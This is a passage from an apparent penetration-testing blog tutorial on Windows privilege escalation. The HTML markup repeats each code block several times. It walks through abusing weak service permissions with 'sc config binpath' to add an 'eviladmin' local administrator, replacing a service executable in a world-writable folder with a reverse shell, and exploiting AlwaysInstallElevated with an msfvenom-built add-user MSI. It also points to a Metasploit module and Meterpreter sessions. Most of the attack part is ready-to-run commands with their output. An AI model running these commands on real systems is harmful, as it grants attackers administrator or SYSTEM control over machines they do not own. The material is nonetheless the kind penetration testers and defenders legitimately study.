        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\testuser\AppData\Local\Temp&gt;sc start "Vulnerable Service"
sc start "Vulnerable Service"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;sc stop </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" even"><span class="">sc stop </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">SERVICE_NAME: Vulnerable Service </span></li><li class=" odd"><span class="">        TYPE               : </span><span class="nu0">10</span><span class="">  WIN32_OWN_PROCESS  </span></li><li class=" even"><span class="">        STATE              : </span><span class="nu0">3</span><span class="">  </span><span class="kw1">STOP_PENDING</span><span class=""> </span></li><li class=" odd"><span class="">                                </span><span class="br0">(</span><span class="">STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">        WIN32_EXIT_CODE    : </span><span class="kw1">0</span><span class="">  </span><span class="br0">(</span><span class="nu0">0x0</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">        SERVICE_EXIT_CODE  : </span><span class="kw1">0</span><span class="">  </span><span class="br0">(</span><span class="nu0">0x0</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">        CHECKPOINT         : </span><span class="nu0">0x0</span><span class=""></span></li><li class=" odd"><span class="">        WAIT_HINT          : </span><span class="nu0">0x0</span><span class=""></span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;sc start </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" even"><span class="">sc start </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">SC</span><span class="br0">]</span><span class=""> StartService FAILED </span><span class="nu0">1053</span><span class="">:</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">The service did not respond to the start or control request in a timely fashion.</span></li></ol><pre style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc stop "Vulnerable Service"
sc stop "Vulnerable Service"

SERVICE_NAME: Vulnerable Service 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\testuser\AppData\Local\Temp&gt;sc start "Vulnerable Service"
sc start "Vulnerable Service"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>When you try to start service it will return an error. As we talked earlier it’s because, when a service starts in Windows operating systems, it must communicate with the Service Control Manager. “net user” cannot communicate with the SCM. No worries, our command will run as SYSTEM and the new user will be added successfully.</p>
<p>Now we should add new “eviladmin” user to local admins by changing “binpath” and starting service again.(We don’t need to stop it again, it is already not running because of it didn’t communicate with the SCM, you know)</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,5" style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"    
sc config "Vulnerable Service" binpath= "net localgroup Administrators eviladmin /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\testuser\AppData\Local\Temp&gt;sc start "Vulnerable Service"
sc start "Vulnerable Service"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Users\testuser\AppData\Local\Temp&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;sc config </span><span class="st0">"Vulnerable Service"</span><span class=""> binpath=</span><span class="st0">"net localgroup Administrators eviladmin /add"</span><span class="">    </span></li><li class=" even"><span class="">sc config </span><span class="st0">"Vulnerable Service"</span><span class=""> binpath= </span><span class="st0">"net localgroup Administrators eviladmin /add"</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">SC</span><span class="br0">]</span><span class=""> ChangeServiceConfig SUCCESS</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;sc start </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" even"><span class="">sc start </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">SC</span><span class="br0">]</span><span class=""> StartService FAILED </span><span class="nu0">1053</span><span class="">:</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">The service did not respond to the start or control request in a timely fashion.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"    
sc config "Vulnerable Service" binpath= "net localgroup Administrators eviladmin /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\testuser\AppData\Local\Temp&gt;sc start "Vulnerable Service"
sc start "Vulnerable Service"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Enjoy your new local admin account!</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="7" style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;net user
net user

User accounts for \\TARGETMACHINE

-------------------------------------------------------------------------------
Administrator            can                      eviladmin                
Guest                    testuser                 
The command completed successfully.


C:\Users\testuser\AppData\Local\Temp&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;net user</span></li><li class=" even"><span class="">net user</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">User accounts for \\TARGETMACHINE</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">-------------------------------------------------------------------------------</span></li><li class="specialline odd"><span class="">Administrator            can                      eviladmin                </span></li><li class=" even"><span class="">Guest                    testuser                 </span></li><li class=" odd"><span class="">The command completed successfully.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\Temp&gt;</span></li></ol><pre style="display: none;">C:\Users\testuser\AppData\Local\Temp&gt;net user
net user

User accounts for \\TARGETMACHINE

-------------------------------------------------------------------------------
Administrator            can                      eviladmin                
Guest                    testuser                 
The command completed successfully.


C:\Users\testuser\AppData\Local\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>As we did before, you can prefer dropping&nbsp;a reverse shell payload to target machine and replacing&nbsp;binpath with the payload’s path.</p>
<p>Instead of manually applying this method&nbsp;you can use this metasploit module:&nbsp;<a href="https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions">exploit/windows/local/service_permissions</a></p>
<p>You have to&nbsp;link it to an existing Meterpreter session:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1-2" style="display: none;">msf &gt; use exploit/windows/local/service_permissions
msf exploit(service_permissions) &gt; show options

Module options (exploit/windows/local/service_permissions):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
   SESSION                      yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">msf &gt; use exploit/windows/local/service_permissions</span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">service_permissions</span><span class="br0">)</span><span class=""> &gt; show options</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Module </span><span class="kw1">options</span><span class=""> </span><span class="br0">(</span><span class="">exploit/windows/local/service_permissions</span><span class="br0">)</span><span class="">:</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">   Name        Current Setting  Required  Description</span></li><li class=" odd"><span class="">   ----        ---------------  --------  -----------</span></li><li class=" even"><span class="">   AGGRESSIVE  false            no        Exploit as many services as </span><span class="kw1">possible</span><span class=""> </span><span class="br0">(</span><span class="">dangerous</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">   SESSION                      yes       The session to run this module on.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Exploit target:</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">   Id  Name</span></li><li class=" odd"><span class="">   --  ----</span></li><li class=" even"><span class="">   </span><span class="nu0">0</span><span class="">   Automatic</span></li></ol><pre style="display: none;">msf &gt; use exploit/windows/local/service_permissions
msf exploit(service_permissions) &gt; show options

Module options (exploit/windows/local/service_permissions):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
   SESSION                      yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<h4>Insecure File/Folder&nbsp;Permissions</h4>
<p>It&nbsp;is very similar to what we did with Unquoted Service Paths.&nbsp;Unquoted Service Paths takes advantage of “CreateProcess” function’s weakness in combination with folder permissions along the executable file path of a service. But here we will try to replace&nbsp;the executable directly.</p>
<p>For example, if we check permissions for our&nbsp;Vulnerable Service’s executable path, we can see it is not protected well:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3-4" style="display: none;">C:\Program Files (x86)\Program Folder&gt;icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
C:\Program Files (x86)\Program Folder\A Subfolder Everyone:(OI)(CI)(F)
                                                  Everyone:(I)(OI)(CI)(F)
                                                  NT SERVICE\TrustedInstaller:(I)(F)
                                                  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                                  NT AUTHORITY\SYSTEM:(I)(F)
                                                  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                  BUILTIN\Administrators:(I)(F)
                                                  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                  BUILTIN\Users:(I)(RX)
                                                  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                                  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\Program Folder&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder&gt;icacls </span><span class="st0">"C:\Program Files (x86)\Program Folder\A Subfolder"</span><span class=""></span></li><li class=" even"><span class="">icacls </span><span class="st0">"C:\Program Files (x86)\Program Folder\A Subfolder"</span><span class=""></span></li><li class="specialline odd"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder\A Subfolder Everyone:</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class="specialline even"><span class="">                                                  Everyone:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                                  NT SERVICE\TrustedInstaller:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                                  NT SERVICE\TrustedInstaller:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                                  NT AUTHORITY\SYSTEM:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                                  NT AUTHORITY\SYSTEM:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                                  BUILTIN\Administrators:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                                  BUILTIN\Administrators:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                                  BUILTIN\Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">RX</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                                  BUILTIN\Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">GR,GE</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                                  CREATOR OWNER:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">RX</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">GR,GE</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Successfully processed </span><span class="nu0">1</span><span class=""> files; Failed processing </span><span class="nu0">0</span><span class=""> files</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder&gt;</span></li></ol><pre style="display: none;">C:\Program Files (x86)\Program Folder&gt;icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
C:\Program Files (x86)\Program Folder\A Subfolder Everyone:(OI)(CI)(F)
                                                  Everyone:(I)(OI)(CI)(F)
                                                  NT SERVICE\TrustedInstaller:(I)(F)
                                                  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                                  NT AUTHORITY\SYSTEM:(I)(F)
                                                  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                  BUILTIN\Administrators:(I)(F)
                                                  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                  BUILTIN\Users:(I)(RX)
                                                  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                                  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\Program Folder&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Simply replacing “Executable.exe” file with a reverse shell payload and restarting the service will give us a meterpreter session with SYSTEM privileges.</p>
<h3>AlwaysInstallElevated</h3>
<p>AlwaysInstallElevated is a policy setting that directs Windows Installer to use elevated permissions when it installs any package on the system. If this policy setting is enabled, privileges are extended to all programs.</p>
<p>Actually enabling that&nbsp;is equivalent to granting administrative rights to&nbsp;non-privileged users. But in a way that I cannot understand,&nbsp;sometimes system administrators enable this setting:</p>
<p><img class="alignnone wp-image-634" src="./Windows Privilege Escalation Methods_files/alwaysinstallelevated-300x193.png" alt="" width="835" height="537" srcset="https://pentest.blog/wp-content/uploads/alwaysinstallelevated-300x193.png 300w, https://pentest.blog/wp-content/uploads/alwaysinstallelevated-768x494.png 768w, https://pentest.blog/wp-content/uploads/alwaysinstallelevated.png 835w" sizes="(max-width: 835px) 100vw, 835px"></p>
<p>You should&nbsp;check this registry values to understand if&nbsp;this policy is enabled:</p>
<blockquote><p>[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]<br>
“AlwaysInstallElevated”=dword:00000001</p>
<p>[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]<br>
“AlwaysInstallElevated”=dword:00000001</p></blockquote>
<p>If you have gotten a low-priv Meterpreter session, the built-in command line tool, reg query will help you to check these values:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3,9,13" data-enlighter-language="null" style="display: none;">meterpreter &gt; getuid
Server username: TARGETCOMPUTER\testuser
meterpreter &gt; shell
Process 812 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ERROR: The system was unable to find the specified registry key or value.

C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ERROR: The system was unable to find the specified registry key or value.

C:\Users\testuser\Desktop&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TARGETCOMPUTER\testuser</span></li><li class="specialline odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">812</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">1</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" even"><span class="">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" odd"><span class="">ERROR: The system was unable to find the specified registry key or value.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" even"><span class="">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" odd"><span class="">ERROR: The system was unable to find the specified registry key or value.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\Desktop&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TARGETCOMPUTER\testuser
meterpreter &gt; shell
Process 812 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ERROR: The system was unable to find the specified registry key or value.

C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ERROR: The system was unable to find the specified registry key or value.

C:\Users\testuser\Desktop&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>If you got an error like “ERROR: The system was unable to find the specified registry key or value.”&nbsp;this means this registry values never created. So, the policy is not enabled.</p>
<p>But if you see the following&nbsp;output, it means the policy setting is enabled and you can exploit it. <img draggable="false" class="emoji" alt="😉" src="./Windows Privilege Escalation Methods_files/1f609.svg"></p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3,9,16" data-enlighter-language="null" style="display: none;">meterpreter &gt; getuid
Server username: TARGETCOMPUTER\testuser
meterpreter &gt; shell
Process 2172 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\testuser\Desktop&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TARGETCOMPUTER\testuser</span></li><li class="specialline odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">2172</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">1</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" even"><span class="">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer</span></li><li class=" odd"><span class="">    AlwaysInstallElevated    REG_DWORD    </span><span class="nu0">0x1</span><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class="specialline even"><span class="">C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" odd"><span class="">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span></li><li class=" even"><span class="">    AlwaysInstallElevated    REG_DWORD    </span><span class="nu0">0x1</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\Desktop&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TARGETCOMPUTER\testuser
meterpreter &gt; shell
Process 2172 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\testuser\Desktop&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>As I said before, in this situation, Windows Installer will&nbsp;use elevated permissions when it installs any package. So we should generate a malicious .msi package and run it. MSFvenom can handle this.</p>
<p>If you want you can generate a .msi package that adds a local admin to our target machine. You should use <em>windows/adduser as a</em> payload:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null" style="display: none;">root@kali:~# msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 277 bytes
Final size of msi file: 159744 bytes
Saved as: add_user.msi
root@kali:~# 
